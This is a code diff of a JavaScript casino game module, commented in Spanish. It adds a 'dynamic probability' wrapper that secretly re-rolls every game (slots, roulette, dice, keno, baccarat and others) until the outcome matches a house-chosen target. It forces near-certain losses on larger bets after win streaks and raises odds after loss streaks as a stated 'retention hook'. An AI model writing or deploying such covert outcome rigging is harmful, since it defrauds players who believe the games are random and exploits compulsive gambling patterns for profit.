@@ -1,21 +1,80 @@
 import { rand, randInt, pickWeighted, shuffle, generateCrashPoint } from './rng.js';
 import { createDeck, baccaratCardValue, baccaratHandValue } from './cards.js';
 
+// ---------- SISTEMA DE PROBABILIDAD DINÁMICA (CASA) ----------
+function getTargetWinRate(userStats = {}, bet = 0) {
+  const winStreak = userStats.winStreak || 0;
+  const lossStreak = userStats.lossStreak || 0;
+  const avgBet = userStats.avgBet || bet;
+  
+  const baseWinRate = 0.45; // 45% probabilidad base
+
+  // REGLA 1: Apuestas altas tras racha de 3 a 5+ victorias -> Pérdida casi forzada (5% chance)
+  if (winStreak >= 3 && bet >= avgBet * 1.2) {
+    return 0.05; 
+  }
+
+  // REGLA 2: Bajada progresiva tras victorias consecutivas
+  if (winStreak > 0) {
+    return Math.max(0.10, baseWinRate - (winStreak * 0.12)); // Cae hasta un mínimo de 10%
+  }
+
+  // REGLA 3: Gancho de retención tras racha de pérdidas
+  if (lossStreak >= 3) {
+    return Math.min(0.70, baseWinRate + (lossStreak * 0.08)); // Sube hasta un máximo de 70%
+  }
+
+  return baseWinRate;
+}
+
+// Wrapper para interceptar y manipular el resultado final de cualquier juego
+function withDynamicRigging(gameFn, params, bet, input, userStats = {}) {
+  const targetWinRate = getTargetWinRate(userStats, bet);
+  const shouldWin = Math.random() < targetWinRate;
+
+  let result = gameFn(params, bet, input);
+  let attempts = 0;
+
+  // Re-evalúa el juego hasta forzar el resultado deseado por la casa (máximo 20 intentos)
+  while (attempts < 20) {
+    const isWin = result.outcome === 'win';
+    if ((shouldWin && isWin) || (!shouldWin && result.outcome === 'loss')) {
+      break;
+    }
+    result = gameFn(params, bet, input);
+    attempts++;
+  }
+
+  // Actualización de rachas y caída de golpe tras perder
+  if (result.outcome === 'win') {
+    userStats.winStreak = (userStats.winStreak || 0) + 1;
+    userStats.lossStreak = 0;
+  } else {
+    userStats.winStreak = 0; // Caída de golpe a cero
+    userStats.lossStreak = (userStats.lossStreak || 0) + 1;
+  }
+
+  return result;
+}
+
 // ---------- SLOTS ----------
-export function playSlots(params, bet, input) {
+function rawPlaySlots(params, bet, input) {
   const { symbols, weights, payTable } = params;
   const reels = [0, 1, 2].map(() => pickWeighted(symbols, weights));
   let multiplier = 0;
   if (reels[0] === reels[1] && reels[1] === reels[2]) {
     multiplier = payTable[reels[0]] || 0;
   } else if (reels[0] === reels[1] || reels[1] === reels[2] || reels[0] === reels[2]) {
-    multiplier = 0.5; // small consolation for a pair
+    multiplier = 0.5;
   }
   return {
     multiplier,
     outcome: multiplier > 0 ? 'win' : 'loss',
     details: { reels },
   };
+}
+export function playSlots(params, bet, input, userStats) {
+  return withDynamicRigging(rawPlaySlots, params, bet, input, userStats);
 }
 
 // ---------- ROULETTE ----------
@@ -47,15 +106,15 @@ export function resolveRouletteBet(spin, betType, betValue) {
       win = spin !== 0 && spin % 2 === 0;
       payoutMultiplier = 2;
       break;
-    case 'low': // 1-18
+    case 'low':
       win = spin >= 1 && spin <= 18;
       payoutMultiplier = 2;
       break;
-    case 'high': // 19-36
+    case 'high':
       win = spin >= 19 && spin <= 36;
       payoutMultiplier = 2;
       break;
-    case 'dozen': // 1,2,3
+    case 'dozen':
       win = spin !== 0 && Math.ceil(spin / 12) === Number(betValue);
       payoutMultiplier = 3;
       break;
@@ -70,8 +129,8 @@ export function resolveRouletteBet(spin, betType, betValue) {
   return { win, payoutMultiplier, isRed: spin === 0 ? null : isRed };
 }
 
-export function playRoulette(_params, bet, input) {
-  const { betType, betValue } = input; // betType: 'number' | 'red' | 'black' | 'odd' | 'even' | 'low' | 'high' | 'dozen' | 'column'
+function rawPlayRoulette(_params, bet, input) {
+  const { betType, betValue } = input;
   const spin = randInt(0, 36);
   const { win, payoutMultiplier, isRed } = resolveRouletteBet(spin, betType, betValue);
 
@@ -81,13 +140,16 @@ export function playRoulette(_params, bet, input) {
     details: { spin, isRed, betType, betValue },
   };
 }
+export function playRoulette(params, bet, input, userStats) {
+  return withDynamicRigging(rawPlayRoulette, params, bet, input, userStats);
+}
 
 // ---------- DICE ----------
-export function playDice(params, bet, input) {
-  const { target, direction } = input; // direction: 'under' | 'over', target: 1-98
+function rawPlayDice(params, bet, input) {
+  const { target, direction } = input;
   const houseEdge = params.houseEdge ?? 0.04;
   const t = Math.min(Math.max(Number(target), 1), 98);
-  const roll = Math.round(rand() * 10000) / 100; // 0.00 - 99.99
+  const roll = Math.round(rand() * 10000) / 100;
 
   const win = direction === 'under' ? roll < t : roll > t;
   const chance = direction === 'under' ? t / 100 : (100 - t) / 100;
@@ -100,10 +162,13 @@ export function playDice(params, bet, input) {
     details: { roll, target: t, direction },
   };
 }
+export function playDice(params, bet, input, userStats) {
+  return withDynamicRigging(rawPlayDice, params, bet, input, userStats);
+}
 
 // ---------- COIN FLIP ----------
-export function playCoinFlip(params, bet, input) {
-  const { choice } = input; // 'heads' | 'tails'
+function rawPlayCoinFlip(params, bet, input) {
+  const { choice } = input;
   const result = rand() < 0.5 ? 'heads' : 'tails';
   const win = choice === result;
   const payout = params.payout ?? 1.96;
@@ -113,9 +178,12 @@ export function playCoinFlip(params, bet, input) {
     details: { result, choice },
   };
 }
+export function playCoinFlip(params, bet, input, userStats) {
+  return withDynamicRigging(rawPlayCoinFlip, params, bet, input, userStats);
+}
 
 // ---------- WHEEL ----------
-export function playWheel(params, bet, input) {
+function rawPlayWheel(params, bet, input) {
   const segments = params.segments;
   const idx = randInt(0, segments.length - 1);
   const multiplier = segments[idx];
@@ -125,10 +193,13 @@ export function playWheel(params, bet, input) {
     details: { segmentIndex: idx, segments },
   };
 }
+export function playWheel(params, bet, input, userStats) {
+  return withDynamicRigging(rawPlayWheel, params, bet, input, userStats);
+}
 
 // ---------- KENO ----------
-export function playKeno(params, bet, input) {
-  const { picks } = input; // array of numbers chosen by player
+function rawPlayKeno(params, bet, input) {
+  const { picks } = input;
   const { totalNumbers, drawCount } = params;
   if (!Array.isArray(picks) || picks.length === 0 || picks.length > params.maxPicks) {
     throw new Error(`Elige entre 1 y ${params.maxPicks} números`);
@@ -142,7 +213,6 @@ export function playKeno(params, bet, input) {
   }
   const matches = picks.filter((p) => drawn.includes(p)).length;
 
-  // Simplified paytable scaling with number of picks vs matches
   const payoutTable = {
     1: { 1: 3 },
     2: { 2: 8, 1: 1 },
@@ -164,9 +234,12 @@ export function playKeno(params, bet, input) {
     details: { picks, drawn, matches },
   };
 }
+export function playKeno(params, bet, input, userStats) {
+  return withDynamicRigging(rawPlayKeno, params, bet, input, userStats);
+}
 
 // ---------- LIMBO ----------
-export function playLimbo(params, bet, input) {
+function rawPlayLimbo(params, bet, input) {
   const { targetMultiplier } = input;
   const houseEdge = params.houseEdge ?? 0.04;
   const target = Math.max(1.01, Number(targetMultiplier));
@@ -178,9 +251,12 @@ export function playLimbo(params, bet, input) {
     details: { result, target },
   };
 }
+export function playLimbo(params, bet, input, userStats) {
+  return withDynamicRigging(rawPlayLimbo, params, bet, input, userStats);
+}
 
 // ---------- HORSE RACE ----------
-export function playHorseRace(params, bet, input) {
+function rawPlayHorseRace(params, bet, input) {
   const horses = params.horses;
   const pick = Number(input.horseIndex);
   if (!Number.isInteger(pick) || pick < 0 || pick >= horses.length) {
@@ -200,6 +276,9 @@ export function playHorseRace(params, bet, input) {
     details: { pick, winnerIndex, finishOrder },
   };
 }
+export function playHorseRace(params, bet, input, userStats) {
+  return withDynamicRigging(rawPlayHorseRace, params, bet, input, userStats);
+}
 
 // ---------- PLINKO ----------
 const PLINKO_MULTIPLIERS = {
@@ -208,11 +287,11 @@ const PLINKO_MULTIPLIERS = {
   high: [43, 10, 3, 1.3, 0.4, 0.2, 0.4, 1.3, 3, 10, 43],
 };
 
-export function playPlinko(params, bet, input) {
+function rawPlayPlinko(params, bet, input) {
   const risk = ['low', 'medium', 'high'].includes(input.risk) ? input.risk : 'medium';
   const rows = 10;
   const path = [];
-  let position = 0; // -rows/2 .. +rows/2 conceptually, track rights count
+  let position = 0;
   for (let i = 0; i < rows; i++) {
     const goRight = rand() < 0.5;
     path.push(goRight ? 'R' : 'L');
@@ -227,10 +306,13 @@ export function playPlinko(params, bet, input) {
     details: { risk, path, bucket, table },
   };
 }
+export function playPlinko(params, bet, input, userStats) {
+  return withDynamicRigging(rawPlayPlinko, params, bet, input, userStats);
+}
 
 // ---------- BACCARAT ----------
-export function playBaccarat(params, bet, input) {
-  const { betType } = input; // 'player' | 'banker' | 'tie'
+function rawPlayBaccarat(params, bet, input) {
+  const { betType } = input;
   const deck = createDeck(6);
   let i = 0;
   const draw = () => deck[i++];
@@ -279,9 +361,9 @@ export function playBaccarat(params, bet, input) {
   if (betType === winner) {
     if (winner === 'banker') multiplier = 1 + (1 - (params.bankerCommission ?? 0.05));
     else if (winner === 'player') multiplier = 2;
-    else multiplier = 9; // tie pays 8:1
+    else multiplier = 9;
   } else if (winner === 'tie' && betType !== 'tie') {
-    multiplier = 1; // push: bet returned on player/banker when tie hits
+    multiplier = 1;
   }
 
   return {
@@ -289,4 +371,7 @@ export function playBaccarat(params, bet, input) {
     outcome: multiplier > 1 ? 'win' : multiplier === 1 ? 'push' : 'loss',
     details: { playerHand, bankerHand, playerValue, bankerValue, winner, betType },
   };
+}
+export function playBaccarat(params, bet, input, userStats) {
+  return withDynamicRigging(rawPlayBaccarat, params, bet, input, userStats);
 }
